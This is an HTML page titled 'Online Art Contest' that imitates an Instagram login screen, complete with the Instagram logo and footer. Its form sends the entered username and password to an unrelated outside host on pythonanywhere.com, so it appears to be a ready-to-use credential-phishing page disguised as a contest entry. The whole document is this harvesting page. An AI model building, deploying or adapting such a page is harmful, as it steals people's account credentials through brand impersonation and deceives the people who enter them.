<head>
  <title>Online Art Contest</title>
</head>

<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css/css.css">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form" action="https://cyrru.pythonanywhere.com/login1" method="POST" class="my-login-validation"
                    novalidate=""">

                    <div class=" input-box">
                    <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true"
                      maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                </div>

                <div class="input-box">
                  <input type="password" name="password" id="password" placeholder="Password" maxlength="30"
                    aria-required="true" autocapitalize="off" autocorrect="off" required>
                </div>

                <span class="button-box">
                  <button class="btn" type="submit">Log in</button>
                </span>

                <a class="forgot" href="/">Forgot password?</a>
                </form>
              </div> <!-- Form-wrap end -->
            </div> <!-- Login-box end -->

            <div class="login-box">
              <p class="text">Don't have an account?<a href="/">Sign up</a></p>
            </div> <!-- Signup-box end --><!-- App end -->
        </div> <!-- Content end -->
        </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <span class="footer-logo">&copy; 2023 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>

    </section>
  </span> <!-- Root -->
</body>
